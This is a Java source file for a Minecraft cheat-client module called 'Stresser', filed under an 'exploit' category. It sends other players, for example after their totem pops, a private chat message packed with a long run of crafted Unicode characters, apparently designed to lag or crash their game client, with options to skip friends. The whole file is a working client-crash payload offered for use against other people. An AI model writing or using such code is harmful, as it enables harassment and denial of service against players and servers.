package me.mioclient.mod.modules.impl.exploit;

import me.mioclient.api.managers.Managers;
import me.mioclient.api.util.entity.EntityUtil;
import me.mioclient.mod.modules.Category;
import me.mioclient.mod.modules.Module;
import me.mioclient.mod.modules.settings.Setting;
import net.minecraft.entity.player.EntityPlayer;

import java.util.HashMap;

public class Stresser extends Module {

    private final Setting<Boolean> load =
            add(new Setting<>("Load", false));
    private final Setting<Boolean> friends =
            add(new Setting<>("NoFriends", true));
    private final Setting<Boolean> logDisable =
            add(new Setting<>("DisableOnDc", true));
    private final Setting<Boolean> safety =
            add(new Setting<>("Safety", false).setParent());
    private final Setting<Integer> health =
            add(new Setting<>("StopHealth", 4, 1, 15, v -> safety.isOpen()));

    public static HashMap<String, Integer> totemPops = new HashMap<>();

    public Stresser() {
        super("Stresser", "THEY CHINESE LAGGED ME", Category.EXPLOIT, true);
    }

    @Override
    public void onEnable() {
        totemPops.clear();
    }

    @Override
    public void onUpdate() {

      if (load.getValue()) {
          sendMessage(mc.getSession().getUsername());
                  
          load.setValue(false);
      }
    }

    @Override
    public void onTotemPop(EntityPlayer player) {
        if (fullNullCheck()
                || player == mc.player
                || safety.getValue() && EntityUtil.getHealth(mc.player) <= health.getValue()
                || friends.getValue() && Managers.FRIENDS.isFriend(player.getName())) {

            return;
        }
        
        sendMessage(player.getName());
    }

    @Override
    public void onLogout() {
        if (!mc.isSingleplayer() && isOn() && !fullNullCheck() && logDisable.getValue()) {
            disable();
        }
    }
    
    private void sendMessage(String playerName) {
        mc.player.sendChatMessage("/msg "
                + playerName
                + " āȁ́Ёԁ؁܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、㄁㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁");
    }
}


